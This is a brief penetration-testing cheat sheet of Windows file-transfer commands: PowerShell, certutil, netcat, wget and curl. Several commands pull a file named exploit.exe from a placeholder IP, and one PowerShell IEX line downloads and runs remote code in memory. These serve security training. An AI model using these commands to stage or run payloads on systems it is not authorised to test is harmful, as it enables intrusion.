# Transfering files from Linux to Windows
## KALI
To Start a server using python

``
python -m SimpleHTTPServer 80
``

``
python -m http.server 80
``

## Powershell
``
powershell.exe (New-Object System.Net.WebClient).DownloadFile('URL', 'Outfile.exe')
``

Download and execute without saving 

``
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('URL')
``

## FTP
``
ftp -v -n -s:file.txt
``
## SMB
``
copy \linux_iP\PAth\to\file
``
## CertUtil
``
certutil.exe -urlcache -split -f "http://IP/exploit.exe"
``
## NetCat \ NC
``
nc -nlvp 4444 > outputfile.exe
``

## Wget
``
wget http://IP/exploit.exe
``

## Curl
``
curl http://IP/exploit.exe -o output.exe
``
